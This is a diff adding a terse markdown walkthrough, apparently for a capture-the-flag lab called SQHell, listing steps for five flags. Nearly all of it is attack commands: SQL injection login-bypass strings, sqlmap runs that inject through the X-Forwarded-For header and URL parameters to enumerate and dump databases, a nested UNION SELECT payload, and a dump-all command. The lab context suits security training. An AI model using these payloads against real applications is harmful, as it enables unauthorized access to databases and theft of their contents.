@@ -1,0 +1,47 @@
+
+## Flag - 1
+
+**In the login page:**
+
+- admin'AND 1=1#
+- admin'OR 1-1#
+- admin'-- -
+
+---
+
+## Flag - 2
+
+- sqlmap --headers="X-Forwarded-For: 1*" -u <ip> --dbs
+- sqlmap --headers="X-Forwarded-For: 1*" -u <ip> -D sqhell_1 --tables
+- sqlmap --headers="X-Forwarded-For: 1*" -u <ip> -D sqhell_1 -T flag --columns
+- sqlmap --headers="X-Forwarded-For: 1*" -u <ip> -D sqhell_1 -T flag -C flag --dump
+
+---
+
+## Flag - 3
+
+- sqlmap -u http://<ip>/register/user-check?username=admin —dbs
+- sqlmap -u http://<ip>/register/user-check?username=admin -D sqhell_3 --tables
+- sqlmap -u http://<ip>/register/user-check?username=admin -D sqhell_3 -T flag --columns
+- sqlmap -u http://<ip>/register/user-check?username=admin -D sqhell_3 -T flag -C flag --dump
+
+---
+
+## Flag - 4
+
+http://<ip>/user?id=13 union all select "1 UNION SELECT 1,flag,4,5 from flag-- -",2,3 from information_schema.tables where table_schema=database()
+
+---
+
+## Flag - 5
+
+- sqlmap -u http://<ip>/post?id=2 --dbs
+- sqlmap -u http://<ip>/post?id=2 -D sqhell_5 --tables
+- sqlmap -u http://<ip>/post?id=2 -D sqhell_5 -T flag --columns
+- sqlmap -u http://<ip>/post?id=2 -D sqhell_5 -T flag -C flag --dump
+
+---
+
+## Extra Command
+
+sqlmap http://sqhell.thm/login -D sqhell_2 — dump-all
